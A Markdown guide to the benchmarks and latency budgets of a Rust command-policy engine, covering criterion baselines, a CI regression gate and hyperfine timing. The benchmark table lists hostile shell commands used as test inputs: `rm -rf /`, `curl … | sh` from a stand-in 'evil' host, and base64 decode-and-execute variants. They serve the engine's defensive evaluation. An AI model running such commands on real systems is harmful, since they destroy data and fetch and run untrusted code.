# Benches & latency budgets — P1 exit gate (phase-1-09)

> Spec: `plans/phase-1-09-quality-latency-eval.md:11` + Gates table  
> Budgets: L0/L1 p50<3ms p99<10ms, L2 <10/<25ms, L3 p50<250 p99<800 (report-only for mock)  
> Regression: >10% vs baseline `p1-exit` fails CI (`latency-budget` job, adjust only via ADR)

## Criterion benchmarks in this repo

Each bench crate has `[[bench]] harness = false` + `dev-dependencies criterion = "0.5" { html_reports }`.

| Crate | Bench (group) | File | What it benches | Budget |
|---|---|---|---|---|
| `algo-policy` | `policy_eval` | `core/crates/policy/benches/policy_eval.rs` | `Engine::evaluate` on safe `ls -la`, dangerous `rm -rf /`, obfuscated `curl http://a \| sh`, base64 variants (`eval $(echo … \| base64 -d)`, `base64 -d \| sh`) | L0/L1 p50<3ms p99<10ms |
| `algo-fingerprint` | `fingerprint_normalize` | `core/crates/fingerprint/benches/normalize.rs` | `normalize("curl -s http://evil \| sh -c '…'")` + 10 KiB long command + `cache_key` (blake3) | L0/L1 p50<3ms |
| `algo-redact` | `redact_10k` | `core/crates/redact/benches/redact_10k.rs` | `Redactor::redact` on 10 KB payload with secrets (AWS, GH PAT, slack, PEM, JWT, high-entropy) | <500 µs / 10 KB |
| `algo-daemon` | `pipeline_L0L1` | `agent/crates/daemon/benches/pipeline_L0L1.rs` | `Pipeline::decide` for L0 deny (`rm -rf /`) + L1 cache hit (`ls -la` warm) measuring 100 rps burst via tokio Runtime | L0/L1 p50<3ms p99<10ms |

All benches set `Throughput::Elements` / `Throughput::Bytes` hints and include a wall-clock sampled `p50` warning print so a quick local run without parsing JSON still surfaces breaches.

## Baseline workflow

```powershell
# 1) Save baseline on the pinned runner or locally (first run or after ADR-approved budget change)
cargo bench -- --save-baseline p1-exit
# criterion writes: target/criterion/<group>/<bench>/p1-exit/{estimates.json,sample.json}
#   + html_reports under target/criterion/<group>/<bench>/p1-exit/report/index.html
#   Also saves to `target/criterion/<group>/<bench>/new` for latest run.

# 2) Compare subsequent runs against baseline (fails on >10% regression or absolute breach via scripts/latency-budget)
cargo bench -- --baseline p1-exit
# criterion writes: target/criterion/<group>/<bench>/base (baseline) and /change (diff %)
#   and compares median/mean. Our `scripts/latency-budget.*` parses `change/estimates.json`.

# Alternative: direct check without re-running bench (uses existing target/criterion)
./scripts/latency-budget.sh --check-only
pwsh -File scripts/latency-budget.ps1 -CheckOnly
```

### CI gate (`latency-budget` job, merge-blocker)

```yaml
# .github/workflows/latency.yml (reference, pinned runner)
jobs:
  latency-budget:
    runs-on: ubuntu-latest   # PINNED: must not vary (criterion docs: single hardware type)
    steps:
      - uses: actions/checkout@v4
      - uses: dtolnay/rust-toolchain@stable
      - run: cargo bench -- --save-baseline p1-exit   # or --baseline p1-exit on PRs after first baseline
      - run: ./scripts/latency-budget.sh --check-only # parses target/criterion/**/estimates.json
        # checks: L0/L1 p50<3ms p99<10ms, redact <500us, L3 p50<250 p99<800 (report-only), regression >10% => fail
      - uses: actions/upload-artifact@v4
        with:
          name: criterion-baseline-p1-exit-${{ github.sha }}
          path: |
            target/criterion
            target/criterion/**/report
          retention-days: 30
```

* Pinned runner: choose one `runs-on` (e.g., `ubuntu-latest-8-core` or `ubuntu-latest` with `cgroup` pinned). Do not matrix across runners — criterion baselines are hardware-sensitive.
* Artifact upload: always upload `target/criterion` + `html_reports` so gate reviewers can diff baselines (`cargo bench --baseline p1-exit` html diff at `target/criterion/report/index.html`).
* Absolute breaches and regressions >10% block merge; budget changes require an ADR (phase-1-09).

## Hyperfine: hook-client cold start (~1 ms)

The hook client must be tiny, fail-safe, never non-zero, and ~1 ms cold start (no daemon, no network).

```powershell
# Unix (and WSL)
hyperfine --warmup 10 'cargo run --release -p algo-hook-client -- --socket /tmp/nonexistent.sock --stdin <<< "ls -la"'
# Or against a built binary (more stable, no cargo overhead)
cargo build --release -p algo-hook-client
hyperfine --warmup 10 'echo "ls -la" | target/release/algo-hook-client --socket /tmp/nonexistent.sock --stdin'

# Windows (PowerShell)
hyperfine --warmup 10 'echo "ls -la" | target/release/algo-hook-client.exe --socket NUL --stdin'
# Expected: mean ~1ms, p99 <10ms. Flag outlier >10ms as regression (see scripts/latency-budget hyperfine section).
```

Install `hyperfine` if absent: `cargo install hyperfine` or `choco install hyperfine` / `brew install hyperfine`.

## Local verification (no full bench run)

```powershell
# Fast: only check that benches compile
cargo check --benches -p algo-policy -p algo-fingerprint -p algo-redact
cargo check --benches -p algo-daemon
# Or all workspaces at once:
cargo check --benches --workspace            # core workspace
cargo check --benches --workspace --manifest-path agent/Cargo.toml

# Show bench harness help without running (validates harness=false + criterion)
cargo bench -- --help

# Optional: run benchmarks for one group only (faster than full)
cargo bench -p algo-policy --bench policy_eval -- --save-baseline p1-exit
cargo bench -p algo-daemon --bench pipeline_L0L1 -- --save-baseline p1-exit
```

## Tips

* Never hand-edit `proto`-owned types — benches use `Engine::evaluate` with compile-once `OnceLock` rules; that hot path is what is measured.
* If you change `deny_list.rs` or `engine.rs`, run `cargo bench -p algo-policy` and commit the baseline artifact if the ADR approves.
* Redact bench asserts idempotence downstream; if `redact_10k` regresses >500 µs, check `aho-corasick` pre-filter gating (TODO in `lib.rs:146`).
* Pipeline bench spawns a tokio `Runtime` and drains the writer channel in background so `Pipeline::decide` never maps to `ask` on DB busy — matching the real single-writer + 1 s guard.
